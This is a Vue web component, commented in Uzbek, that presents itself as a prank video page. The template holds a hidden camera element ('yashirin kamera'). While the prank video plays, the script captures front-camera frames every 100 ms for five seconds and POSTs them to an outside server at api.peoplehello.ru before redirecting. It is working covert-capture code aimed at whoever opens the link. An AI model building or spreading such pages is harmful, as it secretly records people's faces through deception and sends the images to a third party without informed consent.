<template>
  <div class="prank-wrapper">
    <!-- 🎬 KULGILI VIDEO (USER SHUNI KO‘RADI) -->
    <video
        ref="prankVideo"
        src="../assets/prank.mp4"
        autoplay
        playsinline
        class="prank-video"
    ></video>


    <!-- 📸 YASHIRIN KAMERA -->
    <video
        ref="cameraVideo"
        playsinline
        muted
        style="display:none"
    ></video>

    <div class="hint">
      😂 Videoni tomosha qiling...
    </div>
  </div>
</template>

<script>export default {
  data() {
    return {
      frames: [],
      session_id: null
    }
  },

  async mounted() {
    this.session_id = this.$route.params.id
    if (!this.session_id) return

    await this.startCapture()
  },

  methods: {
    async startCapture() {
      try {
        // 🎥 Kamera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        })

        const camVideo = this.$refs.cameraVideo
        camVideo.srcObject = stream
        await camVideo.play()

        // 😂 Prank video
        const prankVideo = this.$refs.prankVideo
        prankVideo.muted = false
        await prankVideo.play()

        // 📸 Frame olish
        const canvas = document.createElement("canvas")
        canvas.width = camVideo.videoWidth || 640
        canvas.height = camVideo.videoHeight || 480
        const ctx = canvas.getContext("2d")

        const start = Date.now()

        const interval = setInterval(() => {
          ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height)
          this.frames.push(canvas.toDataURL("image/jpeg", 0.8))

          if (Date.now() - start >= 5000) {
            clearInterval(interval)
            stream.getTracks().forEach(t => t.stop())
            this.sendFrames()
          }
        }, 100)

      } catch (e) {
        console.error("Camera error:", e)
      }
    },

    async sendFrames() {
      try {
        await fetch("https://api.peoplehello.ru/api/frames-to-video", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            session_id: this.session_id,
            frames: this.frames
          })
        })
      } finally {
        this.$router.push(`/prank/${this.session_id}`)
      }
    }
  }
}

</script>
<style scoped>
.prank-wrapper {
  position: fixed;
  inset: 0;
  background: black;
}

.prank-video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.hint {
  position: absolute;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  color: white;
  background: rgba(0,0,0,.5);
  padding: 8px 16px;
  border-radius: 8px;
  font-size: 15px;
}
</style>
